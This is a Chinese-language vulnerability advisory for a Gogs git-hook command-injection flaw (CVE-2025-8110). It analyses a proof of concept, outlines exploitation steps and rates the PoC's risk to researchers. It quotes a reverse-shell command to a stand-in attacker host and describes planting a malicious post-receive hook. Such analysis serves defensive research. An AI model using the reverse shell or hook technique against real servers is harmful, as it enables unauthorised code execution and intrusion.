## CVE-2025-8110 - Gogs 文件覆盖/命令注入 (RCE)

**漏洞编号:** CVE-2025-8110

**漏洞类型:** 文件覆盖/命令注入 (RCE)

**影响应用:** Gogs

**危害等级:** 高危

**CVSS评分:** 

**影响版本:** <=0.13.3

**利用条件:** 需要认证 (push access), 需要网络访问

**POC 可用性:** 7/10

**POC 类型:** 概念验证

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

POC有效性分析:
此概念验证（POC）代码旨在展示Gogs（一个自托管的Git服务）中存在的Git Hook机制命令注入漏洞，该漏洞影响0.13.3及更早版本（根据搜索结果）或0.13.0及更早版本（根据POC `README.md`）。POC由`README.md`、`bash.sh`和`exploit.py`组成。`README.md`清晰指出漏洞允许拥有Push权限的攻击者通过制作恶意`post-receive`钩子脚本，在Gogs服务器上实现远程代码执行（RCE）。
`exploit.py`脚本是核心演示部分，它在本地文件系统模拟了Git仓库结构，包括`.git/hooks`目录，并向其中写入一个恶意的`post-receive`钩子脚本。此脚本执行`id > /tmp/gogs_exploited`命令，并将输出重定向，随后赋予其执行权限。虽然`exploit.py`不直接与真实Gogs服务器交互，但它有效模拟了攻击者植入恶意钩子的关键步骤，通过验证`/tmp/gogs_exploited`文件的创建及其内容，可证明代码执行。
`bash.sh`文件则提供了更具攻击性的`post-receive`钩子示例，即建立一个反向shell (`bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"`)。此脚本作为潜在的Payload，进一步阐明了漏洞的严重危害。
综合来看，该POC在概念上是健全且有效的，它清晰地演示了通过Git Hook机制实现命令注入并最终导致RCE的全过程，为安全研究提供了扎实的验证基础。

利用步骤:
攻击者利用此Gogs漏洞的典型步骤如下：
1.  **获取Push权限**：攻击者首先需获得对Gogs实例上目标仓库的Push权限。这可能通过注册新账户（如Gogs开放注册）或窃取现有用户凭据实现。
2.  **创建恶意Git Hook**：获得权限后，攻击者在本地克隆仓库，并在`.git/hooks/`目录下创建恶意`post-receive`钩子脚本。此脚本将包含攻击者期望在Gogs服务器上执行的任意命令，例如POC中的反向shell (`bash.sh`) 或简单的系统命令 (`exploit.py`)。
3.  **推送恶意钩子**：攻击者将包含恶意`post-receive`钩子文件的本地仓库更改推送到远程Gogs服务器。由于Gogs漏洞未能正确沙箱化或验证这些钩子脚本。
4.  **远程代码执行**：Gogs服务器接收推送后，其Git daemon会自动执行仓库中的`post-receive`钩子。因此，注入的恶意命令将在Gogs服务器上以运行Gogs服务的用户权限被执行。
5.  **实现攻击目标**：RCE成功后，攻击者可执行任意操作，包括读取/修改敏感文件、建立持久性后门、获取SSH访问权限（如搜索结果1所述）、安装恶意软件或进行内网横向移动，对组织造成高危威胁。

投毒风险分析:
该POC代码对防御性安全研究人员而言，投毒风险评估为**低（10%）**。
1.  **代码透明与意图明确**：POC代码未混淆，`README.md`详述了漏洞性质、影响范围及攻击方式。`exploit.py`的逻辑清晰，核心功能是模拟在本地文件系统创建并写入恶意钩子文件，并执行`id`命令验证。`bash.sh`作为一个反向shell payload示例，其目的在于展示可注入的攻击代码，而非诱导研究人员直接运行。
2.  **本地化模拟执行**：`exploit.py`的所有操作均限制在研究人员的本地文件系统，它在`/tmp/malicious_repo`创建目录和文件，并写入`/tmp/gogs_exploited`。它不连接任何外部网络资源，也不执行可能损害系统或泄露信息的额外操作。执行环境完全受控，不会对研究人员的主机造成实质性威胁。
3.  **无恶意外部依赖**：POC代码不包含外部链接、恶意下载、高风险函数（如`eval`）或调用未知外部二进制文件。所有操作均基于标准Python库和Bash命令，行为透明可预测。
4.  **纯粹的研究目的**：此POC旨在安全研究和概念验证，并非恶意工具。它提供受控环境来理解漏洞工作原理，不诱导执行危险操作。虽然`bash.sh`含反向shell，但其作为攻击Payload的示例，不应被研究人员误认为是自执行代码。
综上，只要研究人员遵循基本的安全操作规范，此POC代码不会带来固有的“投毒”风险。其低风险评估反映了其作为教育和研究工具的性质。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-8110
